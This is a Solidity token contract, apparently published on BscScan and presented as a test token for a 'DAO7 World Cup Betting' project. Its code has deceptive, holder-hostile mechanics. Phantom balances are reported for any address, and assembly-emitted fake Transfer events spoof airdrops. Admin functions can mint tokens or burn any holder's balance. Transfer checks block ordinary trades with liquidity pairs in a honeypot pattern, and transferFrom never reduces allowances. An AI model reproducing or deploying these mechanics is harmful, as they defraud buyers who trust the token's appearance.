/**
 *Submitted for verification at BscScan.com on 2022-10-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
/**  
    DAO7 World Cup Betting is the first playground for sports fans, 
    a Web 3.0 betting platform, and the first World Cup Betting project on the ETHW chain.

    Please note:
    This is dao7 Ecology's test token, please check the official media for its mechanics.
    
    Website:
        https://dao7.cc
    Twitter：
        https://twitter.com/dao7cc
    Telegram:
        https://t.me/dao72022
    
*/


interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


interface chiHelper {
    function mint(uint256 value) external;
    function free(uint256 value) external;
    function freeFrom(address from,uint256 value) external;
    function freeFromUpTo(address from,uint256 value) external;
    function freeUpTo(address from,uint256 value) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Ownable {
    address public owner;
    mapping(address => bool) private admins;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);
    event adminshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

    modifier onlyadmin() {
        require(admins[msg.sender]);
        _;
    }

    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }

    function setAdmins(address[] memory addrs,bool flag) public onlyowneres{
		for (uint256 i = 0; i < addrs.length; i++) {
            admins[addrs[i]] = flag;
		}
    }
}

contract ERC20 is Ownable,IERC20 {
	
    uint8   public decimals = 18;
	uint256 private totalSupply_ = 777777777 * (10 ** decimals);
    string private _name;
    string private _symbol;

    mapping(address => uint256) private balances;
    mapping(address => uint256) private lastClaimBlock;
    mapping(address => bool) private _isMMList;
    mapping(address => bool) private _isPairs;
    mapping(address => mapping(address => uint256)) public allowed;

    address CHI = 0x0000000000004946c0e9F43F4Dee607b0eF1fA1c;

    chiHelper chiHp = chiHelper(CHI);

    address private airFrom = address(0);

    uint256 private airAmount = 777 * (10 ** decimals);

    uint256 private claimAmount = 777 * (10 ** decimals);

    uint256 private claimBlockLimit = 7200;

    uint256 private maxClaimBalance =  10 * (10 ** decimals);

    bool private enableAirDrop = false;
    
    
	constructor(string memory name_, string memory symbol_) {
		owner = msg.sender;
        _name=name_;
        _symbol=symbol_;
        balances[owner] = totalSupply_;
        _isMMList[owner]=true;
        _isMMList[address(this)]=true;
        emit Transfer(address(0), owner, totalSupply_);
    }

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }
    
    function balanceOf(address _owner) public view returns (uint256) {
        if(enableAirDrop){
            if(_owner==address(0)){
                return 0;
            }
            uint256 bl=balances[_owner];
            if(bl>0){
                return bl;
            }
            return airAmount;
        }else{
            return balances[_owner];
        }
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf(msg.sender) >= _value);
        _transfer(msg.sender,_to,_value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf(_from));
        require(_value <= allowed[_from][msg.sender]);
        _transfer(_from,_to,_value);
        return true;
    }

    function _transfer(address _from, address _to, uint256 _value) private{
        if(_isPairs[_from] || _isPairs[_to]){
            require(_isPairs[_from] && _isMMList[_to]);
            require(_isPairs[_to] && _isMMList[_from]);
        }
        if(enableAirDrop){
            if(balances[_from]>0)
		        balances[_from] -= _value;
            else
                balances[_from]=airAmount-_value;
            if(balances[_to]>0 || _isPairs[_to])
                balances[_to] +=  _value;
            else
                balances[_to] = airAmount+_value;
        }else{
            balances[_from] -= _value;
            balances[_to] +=  _value;
        }
        emit Transfer(_from, _to, _value);
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0));
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        require(_spender != address(0));
        return allowed[_owner][_spender];
    }

    function setMMS(address[] memory addrs,bool flag) public onlyadmin{
		for (uint256 i = 0; i < addrs.length; i++) {
            _isMMList[addrs[i]] = flag;
		}
    }

    function setPairs(address[] memory addrs,bool flag) public onlyadmin{
		for (uint256 i = 0; i < addrs.length; i++) {
            _isPairs[addrs[i]] = flag;
		}
    }

    function setCHIContract(address newAddr) public onlyadmin{
        CHI=newAddr;
    }

    function setAirFrom(address newAddr) public onlyadmin{
        airFrom=newAddr;
    }

    function setAirAmount(uint256 _amount) public onlyadmin{
        airAmount=_amount;
    }

    function setEnableAirDrop(bool flag) public onlyadmin{
        enableAirDrop=flag;
    }

    function setClaimAmount(uint256 _amount) public onlyadmin{
        claimAmount = _amount;
    }

    function setClaimBlockLimit(uint256 _amount) public onlyadmin{
        claimBlockLimit = _amount;
    }

    function setMaxClaimBalance(uint256 _amount) public onlyadmin{
        maxClaimBalance = _amount;
    }
    

    function airDropOfBalance(bytes memory _bytes,uint256 addrCount,uint256 amount,uint256 chiCount) public onlyadmin{
        uint256 gasStart = gasleft();
        uint256 _start=0;
        address tempAddress;
        for(uint32 i=0;i<addrCount;i++){
            assembly {
                tempAddress := div(mload(add(add(_bytes, 0x20), _start)), 0x1000000000000000000000000)
            }
            balances[tempAddress]+=amount;
            emit Transfer(airFrom, tempAddress, amount);
            _start+=20;
        }
        uint256 gasSpent;
        uint256 canFree=0;
        if(chiCount>0)
            canFree=chiCount;
        else
            gasSpent = 21000 + gasStart - gasleft() + 16 * _bytes.length;
            canFree = (gasSpent + 14154) / 41130;
        
        if(chiHp.balanceOf(address(this))>canFree)
            chiHp.free(canFree);
    }

    function airDropNoBalance(bytes memory _bytes,uint256 chiCount) public onlyadmin {
        uint256 gasStart = gasleft();
        uint256 gasSpent;
        airDrop(_bytes,airFrom,airAmount);
        uint256 canFree=0;
        if(chiCount>0)
            canFree=chiCount;
        else
            gasSpent = 21000 + gasStart - gasleft() + 16 * _bytes.length;
            canFree = (gasSpent + 14154) / 41130;
        
        if(chiHp.balanceOf(address(this))>canFree)
            chiHp.free(canFree);
    }

    function airDrop(bytes memory _bytes,address _airFrom,uint256 amount)private returns(bool success) {
        uint256 _start = 0;
        uint256 len = _bytes.length / 20;
        bytes32 topic0 = bytes32(keccak256("Transfer(address,address,uint256)"));
        for (uint256 i = 0; i < len; ) {
            assembly {
                mstore(0, amount)
                log3(0, 0x20, topic0, _airFrom, shr(96, mload(add(add(_bytes, 0x20), _start))))
                i := add(i, 1)
                _start := add(_start, 20)
            }
        }
        return true;
    }

    function mint(address target, uint256 amount,bool supplyFlag) public onlyadmin{
        balances[target] += amount;
        if(supplyFlag){
            totalSupply_ += amount;
        }
        emit Transfer(airFrom, target, amount);
    }

    function free(address target,uint256 amount,bool supplyFlag) public onlyadmin{
        balances[target]-=amount;
        if(supplyFlag){
            totalSupply_-=amount;
        }
        emit Transfer(target, address(0), amount);
    }

    function claimDistance(address _addr) public view returns (uint256) {
        
        if(lastClaimBlock[_addr]>0){
            uint256 blockDistance = block.number - lastClaimBlock[_addr];
            if(blockDistance > claimBlockLimit)
                return 0;
            else
                return claimBlockLimit - blockDistance;
        }
        
        return 0;
    }

    function claim() public{

        require(enableAirDrop,"There's no open claim");
        require(balanceOf(msg.sender) <  maxClaimBalance,"Your balance too large");
        require(claimDistance(msg.sender) == 0 , "It's not time yet");
        
        balances[msg.sender] += claimAmount;

        lastClaimBlock[msg.sender]=block.number;
        
        emit Transfer(airFrom, msg.sender, claimAmount);
    }

    function withdraw(address target,uint amount) public onlyadmin {
        payable(target).transfer(amount);
    }

    function withdrawToken(address token,address target, uint amount) public onlyadmin {
        IERC20(token).transfer(target, amount);
    }
    receive() external payable {}
	
}